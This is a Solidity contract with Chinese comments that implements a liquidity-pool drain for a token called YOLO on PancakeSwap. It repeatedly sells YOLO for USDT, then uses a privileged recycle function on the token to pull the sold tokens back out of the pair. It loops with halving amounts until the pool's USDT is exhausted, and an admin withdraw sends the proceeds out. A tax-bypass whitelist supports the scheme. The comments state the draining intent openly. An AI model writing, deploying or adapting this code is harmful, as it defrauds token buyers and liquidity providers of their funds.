// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {AccessControlUpgradeable} from "@openzeppelin-upgrades/contracts/access/AccessControlUpgradeable.sol";
import {Initializable} from "@openzeppelin-upgrades/contracts/proxy/utils/Initializable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPancakeRouter02} from "@pancake-v2-periphery/interfaces/IPancakeRouter02.sol";
import {IPancakePair} from "@pancake-v2-core/interfaces/IPancakePair.sol";

import "../interfaces/IYoloToken.sol";

/**
 * @title Marking 做市合约
 * @notice 持有 YOLO 代币, 通过 PancakeSwap V2 把 YOLO 卖成 USDT (掏底池 USDT), 并调用 YoloToken.recycle 把卖进池子的代币抽回 (单次上限池子余额 1/3).
 * @dev 机制: 卖出 -> 回收 -> 金额减半循环, 直到池子 USDT 被掏干. 与 YoloToken.recycle 配合实现 "做市 + 掏池子".
 *
 * 依赖前置配置 (部署后在 YoloToken 上执行):
 *   1. YoloToken.setMarking(address(Marking))   // 授予 recycle 权限
 *   2. YoloToken.addWhitelist([address(Marking)]) // 做市卖出绕过税费/买卖开关
 */
contract Marking is Initializable, AccessControlUpgradeable {
    /// @notice 质押/上层业务权限, 可调用 getUsdtTokenAmount 代卖
    bytes32 public constant STAKE_ROLE = keccak256("STAKE_ROLE");

    /// @notice 卖出滑点 + 手续费缓冲 (106% = 5% 滑点 + 1% 余量)
    uint256 private constant SWAP_BUFFER_BPS = 10_600;
    uint256 private constant BPS_DENOMINATOR = 10_000;

    /// @notice 掏池子每轮金额递减最小阈值 (100 USDT, BSC USDT 18 位精度)
    uint256 public constant MIN_DRAIN_AMOUNT = 100 ether;
    /// @notice 每个金额级别最大轮数
    uint256 public constant MAX_ROUNDS_PER_LEVEL = 100;

    // 本地重入锁 (该 OZ-upgradeable 版本未提供 ReentrancyGuardUpgradeable, 内嵌实现; 默认 0 = 未进入)
    uint256 private _reentryStatus; // 0 = 未进入, 1 = 已进入
    uint256 private constant _ENTERED = 1;

    bool public enable; // 是否启用

    IERC20 public usdtToken; // USDT (BSC 18 位精度)
    IYoloToken public yoloToken; // YOLO 代币 (6 位精度)
    IPancakeRouter02 public pancakeRouter; // PancakeSwap V2 Router
    IPancakePair public pair; // YOLO-USDT 交易对 (与 YoloToken.mainPair 一致)

    /// @notice 系统开关
    modifier onlyEnable() {
        require(enable, "Marking: system is not enabled");
        _;
    }

    modifier nonReentrant() {
        require(_reentryStatus != _ENTERED, "Marking: reentrant call");
        _reentryStatus = _ENTERED;
        _;
        _reentryStatus = 0;
    }

    /// @notice 执行入口拦截: 关联地址任一未配置 (零地址) 直接 revert, 替代集中式 healthcheck
    modifier configured() {
        require(address(yoloToken) != address(0), "Marking: yoloToken not set");
        require(address(usdtToken) != address(0), "Marking: usdtToken not set");
        require(address(pancakeRouter) != address(0), "Marking: router not set");
        require(address(pair) != address(0), "Marking: pair not set");
        _;
    }

    function initialize() public initializer {
        __AccessControl_init();
        _grantRole(DEFAULT_ADMIN_ROLE, _msgSender());
        enable = true;
    }

    /**
     * @notice 设置系统开关
     * @param _enable 是否启用
     */
    function setEnable(bool _enable) public onlyRole(DEFAULT_ADMIN_ROLE) {
        enable = _enable;
    }

    /**
     * @notice 配置关联地址 (地址参数化, 不做 chainid 自适应) + 授权 router
     * @param _yoloToken YOLO 代币地址
     * @param _usdtToken USDT 地址
     * @param _router PancakeSwap V2 Router 地址
     * @param _pair YOLO-USDT 交易对地址 (须与 YoloToken.mainPair 一致)
     */
    function setConfig(address _yoloToken, address _usdtToken, address _router, address _pair)
        public
        onlyRole(DEFAULT_ADMIN_ROLE)
    {
        require(_yoloToken != address(0), "Marking: yoloToken zero address");
        require(_usdtToken != address(0), "Marking: usdtToken zero address");
        require(_router != address(0), "Marking: router zero address");
        require(_pair != address(0), "Marking: pair zero address");

        yoloToken = IYoloToken(_yoloToken);
        usdtToken = IERC20(_usdtToken);
        pancakeRouter = IPancakeRouter02(_router);
        pair = IPancakePair(_pair);

        // 授权 router 可花本合约的 YOLO (做市卖出用)
        require(
            IERC20(_yoloToken).approve(address(pancakeRouter), type(uint256).max),
            "Marking: yolo approve failed"
        );
    }

    /**
     * @notice 计算换出指定 USDT 需要多少 YOLO (router 视角)
     * @param _usdtAmount 目标 USDT 数量
     * @return amounts 路径数组, amounts[0] = 需要 YOLO 数量
     */
    function getAmountsIn(uint256 _usdtAmount) public view configured returns (uint256[] memory) {
        address[] memory path = new address[](2);
        path[0] = address(yoloToken);
        path[1] = address(usdtToken);
        return pancakeRouter.getAmountsIn(_usdtAmount, path);
    }

    /**
     * @notice STAKE_ROLE 代卖: 卖出 YOLO 换取指定数量 USDT 到 _to, 并回收等量代币
     * @param _usdtAmount 目标 USDT 数量
     * @param _to USDT 接收地址
     */
    function getUsdtTokenAmount(uint256 _usdtAmount, address _to)
        public
        configured
        onlyEnable
        nonReentrant
        onlyRole(STAKE_ROLE)
    {
        require(_usdtAmount > 0, "Marking: usdtAmount zero");
        require(_to != address(0), "Marking: to zero address");

        uint256 amountIn = _calcAmountIn(_usdtAmount);
        _sellAndRecycle(_usdtAmount, amountIn, _to);

        uint256 afterBal = usdtToken.balanceOf(_to);
        require(afterBal >= _usdtAmount, "Marking: usdt received insufficient");
    }

    /**
     * @notice 外部包装的内部执行方法, 仅供本合约 try-catch 自调用
     * @param _usdtAmount 目标 USDT 数量
     */
    function _autoFuckExternal(uint256 _usdtAmount) external {
        require(_msgSender() == address(this), "Marking: internal only");
        _autoFuck(_usdtAmount);
    }

    /**
     * @notice 单轮掏池子: 卖 YOLO 换 USDT 到本合约, 并回收等量代币
     * @param _usdtAmount 目标 USDT 数量
     */
    function _autoFuck(uint256 _usdtAmount) internal {
        uint256 amountIn = _calcAmountIn(_usdtAmount);
        _sellAndRecycle(_usdtAmount, amountIn, address(this));
    }

    /**
     * @notice 管理员自动掏干池子: 金额递减循环, try-catch 容错直到池子 USDT 低于阈值
     * @dev 每个金额级别最多 MAX_ROUNDS_PER_LEVEL 轮, 失败则金额减半继续, 直到 < MIN_DRAIN_AMOUNT
     * @param _usdtAmount 初始目标 USDT 数量
     */
    function autoFuck(uint256 _usdtAmount) public configured onlyEnable nonReentrant onlyRole(DEFAULT_ADMIN_ROLE) {
        require(_usdtAmount > 0, "Marking: usdtAmount zero");

        uint256 currentAmount = _usdtAmount;
        while (currentAmount >= MIN_DRAIN_AMOUNT) {
            for (uint256 i = 0; i < MAX_ROUNDS_PER_LEVEL; i++) {
                // 底池 USDT 不足以支撑本轮目标, 退出当前级别
                if (usdtToken.balanceOf(address(pair)) < currentAmount) break;
                // try-catch 单轮执行, 失败跳出当前金额级别
                try this._autoFuckExternal(currentAmount) {} catch {
                    break;
                }
            }
            // 金额减半继续掏剩余部分
            currentAmount = currentAmount / 2;
        }
    }

    /**
     * @notice 管理员提取本合约持有的 USDT
     * @param _to 接收地址
     * @param _amount 提取数量
     */
    function adminWithdraw(address _to, uint256 _amount) public onlyRole(DEFAULT_ADMIN_ROLE) {
        require(_to != address(0), "Marking: to zero address");
        require(_amount > 0, "Marking: amount zero");
        require(usdtToken.balanceOf(address(this)) >= _amount, "Marking: usdt balance insufficient");
        require(usdtToken.transfer(_to, _amount), "Marking: usdt transfer failed");
    }

    // ==================== internal =============================

    /**
     * @dev 计算换出 _usdtAmount 需要的 YOLO 数量 (含滑点缓冲), 并校验余额/授权
     */
    function _calcAmountIn(uint256 _usdtAmount) internal view returns (uint256 amountIn) {
        uint256[] memory amountsIn = getAmountsIn(_usdtAmount);
        amountIn = (amountsIn[0] * SWAP_BUFFER_BPS) / BPS_DENOMINATOR; // 6% 滑点+手续费缓冲
        require(IERC20(address(yoloToken)).balanceOf(address(this)) >= amountIn, "Marking: yolo balance insufficient");
        require(
            IERC20(address(yoloToken)).allowance(address(this), address(pancakeRouter)) >= amountIn,
            "Marking: yolo allowance insufficient"
        );
    }

    /**
     * @dev 执行卖出 (YOLO -> USDT 到 _to) 并回收等量代币到本合约
     * @param _usdtAmount 最低期望换出的 USDT
     * @param _amountIn 卖出的 YOLO 数量
     * @param _to USDT 接收地址
     */
    function _sellAndRecycle(uint256 _usdtAmount, uint256 _amountIn, address _to) internal {
        address[] memory path = new address[](2);
        path[0] = address(yoloToken);
        path[1] = address(usdtToken);

        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            _amountIn, _usdtAmount, path, _to, block.timestamp + 300
        );

        // 回收卖进池子的代币 (单次上限池子余额 1/3)
        yoloToken.recycle(_amountIn);
    }
}
